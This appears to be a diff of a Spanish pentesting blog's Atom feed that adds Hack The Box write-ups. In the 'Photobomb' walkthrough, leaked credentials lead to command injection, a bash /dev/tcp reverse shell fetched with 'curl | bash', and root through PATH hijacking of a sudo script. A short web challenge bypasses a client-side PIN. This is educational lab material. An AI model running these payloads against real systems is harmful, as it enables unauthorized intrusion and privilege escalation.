@@ -1,4 +1,367 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-25T23:33:18+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">M3f1s7o Blog</title><subtitle>Pentesting y Linux</subtitle><author><name>Jimmy Mendoza</name></author><entry><title type="html">IP Validation</title><link href="http://localhost:4000/ip-validation/" rel="alternate" type="text/html" title="IP Validation" /><published>2023-06-25T00:00:00+00:00</published><updated>2023-06-25T00:00:00+00:00</updated><id>http://localhost:4000/ip-validation</id><content type="html" xml:base="http://localhost:4000/ip-validation/"><![CDATA[<h1 id="ip-validation">IP Validation</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-07-31T02:17:50+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">M3f1s7o Blog</title><subtitle>Pentesting y Linux</subtitle><author><name>Jimmy Mendoza</name></author><entry><title type="html">Photobomb</title><link href="http://localhost:4000/photobomb/" rel="alternate" type="text/html" title="Photobomb" /><published>2023-07-30T00:00:00+00:00</published><updated>2023-07-30T00:00:00+00:00</updated><id>http://localhost:4000/photobomb</id><content type="html" xml:base="http://localhost:4000/photobomb/"><![CDATA[<h1 id="photobomb-walkthrough">Photobomb Walkthrough</h1>
+
+<p><a href="https://app.hackthebox.com/machines/500">Enlace a la máquina</a></p>
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Empezaremos con un reconocimiento de los puertos usando nmap.</p>
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-vvv</span> <span class="nt">-oN</span> all_ports 10.10.11.182
+<span class="go">Nmap scan report for 10.10.11.182  
+Host is up, received user-set (0.079s latency).  
+Scanned at 2023-07-26 09:26:36 CST for 13s  
+Not shown: 65533 closed tcp ports (reset)  
+PORT   STATE SERVICE REASON  
+22/tcp open  ssh     syn-ack ttl 63  
+80/tcp open  http    syn-ack ttl 63  
+  
+Read data files from: /usr/bin/../share/nmap  
+</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Wed Jul 26 09:26:49 2023 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.75 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ahora, vamos a lanzar un escaneo más a detalle sobre el puerto <code class="language-plaintext highlighter-rouge">80</code> y el <code class="language-plaintext highlighter-rouge">22</code>.</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-oN</span> targeted 10.10.11.182
+<span class="go">Nmap scan report for 10.10.11.182
+Host is up (0.081s latency).
+
+PORT   STATE SERVICE VERSION
+</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey: 
+|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
+|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
+|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Wed Jul 26 09:28:00 2023 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.54 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="página-web">Página web</h3>
+<p>Al parecer tenemos una página web llamada <code class="language-plaintext highlighter-rouge">photobomb.htb</code>, vamos a escribir la <code class="language-plaintext highlighter-rouge">ip</code> de la máquina en el navegador.
+<img src="/assets/images/maquinas/Pasted image 20230727085142.png" alt="image" /></p>
+
+<p>El servidor nos indica que hay un sitio con dirección <code class="language-plaintext highlighter-rouge">photobomb.htb</code> pero no lo está resolviendo, por lo que vamos a agregar la dirección a nuestra lista de hosts:</p>
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"10.10.11.182 photobomb.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts  
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ahora, si recargamos la página, ya podemos ver el sitio <code class="language-plaintext highlighter-rouge">photobomb.htb</code>:
+<img src="/assets/images/maquinas/Pasted image 20230727085450.png" alt="image" /></p>
+
+<p>El único enlace que se nos presenta nos abre un dialogo de acceso, de la cual no pasamos tratando de adivinar las credenciales. Si damos en cancelar, nos redirige a la ruta <code class="language-plaintext highlighter-rouge">/printer</code> con error <code class="language-plaintext highlighter-rouge">401</code>.</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727090009.png" alt="image" /></p>
+
+<h4 id="código-fuente">Código fuente</h4>
+<p>Vamos a ver el código fuente de la página, a veces hay cosas interesantes ahí.
+<img src="/assets/images/maquinas/Pasted image 20230727090404.png" alt="image" /></p>
+
+<p>Podemos ver que hay un script en la línea 6 llamado <code class="language-plaintext highlighter-rouge">photobomb.js</code>, vamos a ver qué se esconde ahí.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
+  <span class="c1">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me</span>
+  <span class="nf">if </span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^</span><span class="se">(</span><span class="sr">.*;</span><span class="se">)?\s</span><span class="sr">*isPhotoBombTechSupport</span><span class="se">\s</span><span class="sr">*=</span><span class="se">\s</span><span class="sr">*</span><span class="se">[^</span><span class="sr">;</span><span class="se">]</span><span class="sr">+</span><span class="se">(</span><span class="sr">.*</span><span class="se">)?</span><span class="sr">$/</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">creds</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">href</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://pH0t0:b0Mb!@photobomb.htb/printer</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">init</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Al parecer, lo que hace este script es dar el ingreso a los usuarios que tengan una cookie llamada <em>isPhotoBombTechSupport</em>, y los redirige a una url con las credenciales de acceso en ella. Así que podemos ir nosotros a esa misma url, o ingresar <code class="language-plaintext highlighter-rouge">pH0t0</code> como usuario y <code class="language-plaintext highlighter-rouge">b0Mb!</code> como contraseña.</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727091021.png" alt="image" /></p>
+
+<h4 id="printer">Printer</h4>
+<p>Y tenemos acceso a <code class="language-plaintext highlighter-rouge">/printer</code>. La funcionalidad de esta página parece ser para re escalar imágenes que luego podemos descargar para imprimir, de hecho si seleccionamos una imagen y un tamaño, podemos descargar la imagen a nuestro equipo.</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727091159.png" alt="image" /></p>
+
+<p>Una de las cosas que observé fue que la primera vez que seleccionas una resolución diferente a la que está por default, la página tarda un poco en tener lista la descarga, pero la segunda vez que solicitas la imagen es inmediata la descarga, sospecho que se trata de un re escalamiento por medio de un comando, que tarda unos segundos en procesar la imagen al tamaño deseado, y guarda las copias temporalmente.</p>
+
+<h3 id="burp-suite">Burp Suite</h3>
+
+<p>Vamos a usar el proxy de Burp Suite para ver las peticiones que se están enviando.
+<img src="/assets/images/maquinas/Pasted image 20230727091704.png" alt="image" /></p>
+
+<p>Y una vez tengamos la petición, la mandamos al Repeater.</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727091857.png" alt="image" /></p>
+
+<p>Observamos tres campos que se están mandando:</p>
+<ol>
+  <li>El nombre de la imagen</li>
+  <li>El tipo</li>
+  <li>Y las dimensiones</li>
+</ol>
+
+<p>Puede ser que en el servidor se esté ejecutando un comando que utilice esos 3 argumentos para generar la imagen, algo así como:</p>
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>resize <span class="nt">-n</span> <span class="s2">"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"</span> <span class="nt">-t</span> <span class="s2">"jpg"</span> <span class="nt">-s</span> <span class="s2">"30x20"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Esto no nos permitiría inyectar comandos, porque lo que introduzcamos estaría siendo tomado como cadena, pero si el comando luce más como:</p>
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>resize <span class="nt">-n</span> mark-mc-neill-4xWHIpY2QcY-unsplash.jpg <span class="nt">-t</span> jpg <span class="nt">-s</span> 30x20
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Habría una vulnerabilidad a inyección de comandos, por lo que si introducimos un <code class="language-plaintext highlighter-rouge">;</code> muy probablemente causaremos un error en el proceso. Probemos uno por uno.</p>
+
+<p>El único campo que parece ser vulnerable es el <code class="language-plaintext highlighter-rouge">filetype</code>, cuando insertamos un punto y coma, el servidor tarda en responder y finalmente nos dice que <em>falló en generar una copia de la imagen</em>, diferente a la respuesta que obteníamos con los otros campos.</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727093219.png" alt="image" /></p>
+
+<p>Pero para estar seguros insertemos un comando que nos pueda dar una señal de que se está ejecutando, pues no obtendremos respuesta en formato de texto. Usemos <code class="language-plaintext highlighter-rouge">sleep</code>, si se ejecuta conseguiremos que el servidor tarde <code class="language-plaintext highlighter-rouge">x</code> tiempo en responder. Inyectemos <code class="language-plaintext highlighter-rouge">;sleep+15</code> (el <code class="language-plaintext highlighter-rouge">+</code> sustituye al espacio).</p>
+
+<p>Y efectivamente, el servidor tarda &gt; 15 segundos en responder. Tenemos una inyección de comandos.</p>
+
+<hr />
+<h2 id="ataque">Ataque</h2>
+<p>Con esta vulnerabilidad deberíamos buscar una reverse shell que nos deje entrar al equipo.</p>
+
+<h3 id="reverse-shell">Reverse shell</h3>
+<h4 id="script-para-la-reverse">Script para la reverse</h4>
+<p>Vamos a crear un archivo <code class="language-plaintext highlighter-rouge">index.html</code> que podamos servir a través de un servidor <code class="language-plaintext highlighter-rouge">http</code>, y que contenga el script para la reverse shell:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>bash -c "bash -i &gt;<span class="err">&amp;</span> /dev/tcp/10.10.14.13/4040 0&gt;<span class="err">&amp;</span>1"
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="servidor-http">Servidor http</h4>
+<p>En el directorio donde se encuentra <code class="language-plaintext highlighter-rouge">index.html</code> vamos a ejecutar:</p>
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> http.server 80
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="nc">nc</h4>
+<p>Y vamos a escuchar a conexiones entrantes con <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-nlvp</span> 4040
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727094651.png" alt="image" /></p>
+
+<h4 id="inyección">Inyección</h4>
+<p>Es momento de inyectar el comando que nos de la reverse shell: <code class="language-plaintext highlighter-rouge">;curl+10.10.14.10+|+bash</code>.</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727095256.png" alt="image" /></p>
+
+<p>Tenemos una reverse, ahora faltaría acondicionarla.</p>
+
+<h3 id="primer-bandera">Primer bandera</h3>
+<p>La encontramos en nuestro directorio home.
+<img src="/assets/images/maquinas/Pasted image 20230727100105.png" alt="image" /></p>
+
+<hr />
+<h2 id="escalamiento">Escalamiento</h2>
+<p>Veamos si tenemos algún permiso como <code class="language-plaintext highlighter-rouge">sudo</code> o estamos en algún grupo privilegiado.</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>  
+<span class="go">uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)  
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>  
+<span class="go">Matching Defaults entries for wizard on photobomb:  
+   env_reset, mail_badpass,  
+   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+  
+User wizard may run the following commands on photobomb:  
+   (root) SETENV: NOPASSWD: /opt/cleanup.sh
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ningún grupo importante, pero vemos que podemos ejecutar el script <code class="language-plaintext highlighter-rouge">cleanup.sh</code> como root sin utilizar contraseña (<code class="language-plaintext highlighter-rouge">NOPASSWD</code>) y conservando nuestro <code class="language-plaintext highlighter-rouge">PATH</code> (<code class="language-plaintext highlighter-rouge">SETENV</code>). Lo que ya nos da una idea de <strong>PATH hijacking</strong>. Pero veamos el script <code class="language-plaintext highlighter-rouge">cleanup.sh</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash  </span>
+<span class="nb">.</span> /opt/.bashrc  
+<span class="nb">cd</span> /home/wizard/photobomb  
+  
+<span class="c"># clean up log files  </span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>  
+<span class="k">then</span>  
+ /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old  
+ /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log  
+<span class="k">fi</span>  
+  
+<span class="c"># protect the priceless originals  </span>
+find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Este script carga su configuración de un <code class="language-plaintext highlighter-rouge">.bashrc</code> ubicado en el mismo directorio y luego hace una copia del <code class="language-plaintext highlighter-rouge">photobomb.log</code>, por último, con <code class="language-plaintext highlighter-rouge">find</code> protege las imágenes originales.</p>
+
+<p>Revisemos <code class="language-plaintext highlighter-rouge">.bashrc</code>:</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>System-wide .bashrc file <span class="k">for </span>interactive bash<span class="o">(</span>1<span class="o">)</span> shells.  
+<span class="go">  
+</span><span class="gp">#</span><span class="w"> </span>To <span class="nb">enable </span>the settings / commands <span class="k">in </span>this file <span class="k">for </span>login shells as well,  
+<span class="gp">#</span><span class="w"> </span>this file has to be sourced <span class="k">in</span> /etc/profile.  
+<span class="go">  
+</span><span class="gp">#</span><span class="w"> </span>Jameson: ensure that snaps don<span class="s1">'t interfere, '</span>cos they are dumb  
+<span class="gp">PATH=$</span><span class="o">{</span>PATH/:<span class="se">\/</span>snap<span class="se">\/</span>bin/<span class="o">}</span>  
+<span class="go">  
+</span><span class="gp">#</span><span class="w"> </span>Jameson: caused problems with testing whether to rotate the log file  
+<span class="gp">enable -n [ #</span><span class="w"> </span><span class="o">]</span>  
+<span class="go">  
+</span><span class="gp">#</span><span class="w"> </span>If not running interactively, don<span class="s1">'t do anything  
+</span><span class="gp">[ -z "$</span><span class="s1">PS1" ] &amp;&amp; return  
+</span><span class="go">  
+</span><span class="gp">#</span><span class="w"> </span>check the window size after each <span class="nb">command </span>and, <span class="k">if </span>necessary,  
+<span class="gp">#</span><span class="w"> </span>update the values of LINES and COLUMNS.  
+<span class="go">shopt -s checkwinsize  
+  
+-- SNIP --
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ninguno de estos dos archivos tiene permisos de escritura, por lo que debe haber una forma de ganar acceso al <code class="language-plaintext highlighter-rouge">root</code> <strong>con solamente ejecutarlos</strong>. Algo raro que se hace en <code class="language-plaintext highlighter-rouge">.bashrc</code> es lo que está en la <em>línea 10</em>: <code class="language-plaintext highlighter-rouge">enable -n [</code>, lo que esto hace es deshabilitar el comando <code class="language-plaintext highlighter-rouge">[</code> (sí, el corchete es un comando).</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727103119.png" alt="image" /></p>
+
+<p>Así que, cuando se ejecuta el script <code class="language-plaintext highlighter-rouge">cleanup.sh</code>, el binario <code class="language-plaintext highlighter-rouge">[</code> nativo no será ejecutado, dándonos oportunidad de especificar la ruta de un binario con el mismo nombre, pero que nos sea más útil.</p>
+
+<h3 id="ejecutable-malicioso">Ejecutable malicioso</h3>
+<p>Creemos un ejecutable llamado <code class="language-plaintext highlighter-rouge">[</code> que será el que se ejecute cuando lancemos el script como <strong>root</strong>. Su contenido será una simple llamada a una <code class="language-plaintext highlighter-rouge">bash</code>, que se ejecutará bajo el mismo usuario que el script, es decir, <strong>root</strong>.</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /tmp
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> <span class="o">&gt;</span> <span class="o">[</span>
+<span class="go">bash
+^C
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">chmod</span> +x <span class="o">[</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ahora, lo que queda hacer es lanzar el script <strong>incluyendo en el <code class="language-plaintext highlighter-rouge">PATH</code></strong> la ruta de nuestro ejecutable malicioso en primer lugar para garantizar que se ejecute antes de cualquier otro binario con el mismo nombre:</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> /opt/cleanup.sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="segunda-bandera">Segunda bandera</h3>
+<p>Boom. Tenemos una bash como usuario root.</p>
+
+<p><img src="/assets/images/maquinas/Pasted image 20230727104551.png" alt="image" /></p>]]></content><author><name>Jimmy Mendoza</name></author><category term="maquina" /><category term="maquinas" /><category term="linux" /><category term="hackthebox" /><category term="easy" /><category term="pentesting" /><category term="path_hijacking" /><category term="inyeccion" /><summary type="html"><![CDATA[Máquina de Hack The Box en donde se explota una vulnerabiliad de inyección de comandos, y se hace PATH hijacking para obtner privilegios de super usuario.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Trapped Source</title><link href="http://localhost:4000/trapped-source/" rel="alternate" type="text/html" title="Trapped Source" /><published>2023-07-30T00:00:00+00:00</published><updated>2023-07-30T00:00:00+00:00</updated><id>http://localhost:4000/trapped-source</id><content type="html" xml:base="http://localhost:4000/trapped-source/"><![CDATA[<h1 id="trapped-source">Trapped Source</h1>
+
+<p><a href="https://app.hackthebox.com/challenges/491">Enlace del reto</a></p>
+
+<p>La dirección que se nos proporciona en este reto nos lleva a la siguiente página web:</p>
+
+<p><img src="/assets/images/maquinas/locked.png" alt="locked" /></p>
+
+<p>La cual es una caja fuerte de la cual necesitamos encontrar la combinación. Probando algunas de las más obvias, vemos que no va a ser una tarea sencilla si tratamos de adivinar. Por eso, vamos a ver el código fuente de la página:</p>
+
+<h2 id="código-fuente">Código fuente</h2>
+
+<p><img src="/assets/images/maquinas/source_code.png" alt="source" /></p>
+
+<p>El script <code class="language-plaintext highlighter-rouge">script.js</code> luce interesante, vamos analizarlo.</p>
+
+<h2 id="javascript">javascript</h2>
+<p><img src="/assets/images/maquinas/script.js.png" alt="script" /></p>
+
+<p>Un vistazo a la lógica del código nos dice que este script es el que valida nuestro intento de acceder, y el que nos va a dar la bandera una vez hayamos acertado. En resumidas cuentas:</p>
+<ul>
+  <li>si nuestro pin es igual al definido como correcto
+    <ul>
+      <li>va a enviar una petición <code class="language-plaintext highlighter-rouge">POST</code> a la ruta <code class="language-plaintext highlighter-rouge">/flag</code> con header de tipo de contenido <code class="language-plaintext highlighter-rouge">JSON</code>, y como cuerpo enviará el pin correcto.</li>
+    </ul>
+  </li>
+  <li>si no
+    <ul>
+      <li>va a mostrar el texto <strong>INVALID!</strong> y va a resetear el pin que pusimos.</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/assets/images/maquinas/acceso_script.png" alt="acceso" /></p>
+
+<h2 id="petición-propia">Petición propia</h2>
+<p>Con esta información, podemos empezar a pensar que no es necesario utilizar la página web, podemos hacer la petición desde la terminal utilizando <code class="language-plaintext highlighter-rouge">CURL</code>, agregando cada uno de los campos necesarios. Y como <code class="language-plaintext highlighter-rouge">pin</code> podemos poner cualquier cosa, porque en la petición se envía el pin que ya fue validado.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="chroma"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-sX</span> POST http://138.68.148.72:31634/flag <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"pin": "  
+000"}'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Y de esta manera obtenemos la bandera:</p>
+
+<p><img src="/assets/images/maquinas/bandera_trapped.png" alt="bandera" /></p>]]></content><author><name>Jimmy Mendoza</name></author><category term="retos" /><category term="retos" /><category term="hackthebox" /><category term="pentesting" /><category term="web" /><category term="very_easy" /><summary type="html"><![CDATA[Reto web de Hack The Box]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/" /><media:content medium="image" url="http://localhost:4000/" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">IP Validation</title><link href="http://localhost:4000/ip-validation/" rel="alternate" type="text/html" title="IP Validation" /><published>2023-06-25T00:00:00+00:00</published><updated>2023-06-25T00:00:00+00:00</updated><id>http://localhost:4000/ip-validation</id><content type="html" xml:base="http://localhost:4000/ip-validation/"><![CDATA[<h1 id="ip-validation">IP Validation</h1>
 
 <p><a href="https://www.codewars.com/kata/515decfd9dcfc23bb6000006/shell">Enlace al Kata</a></p>
 
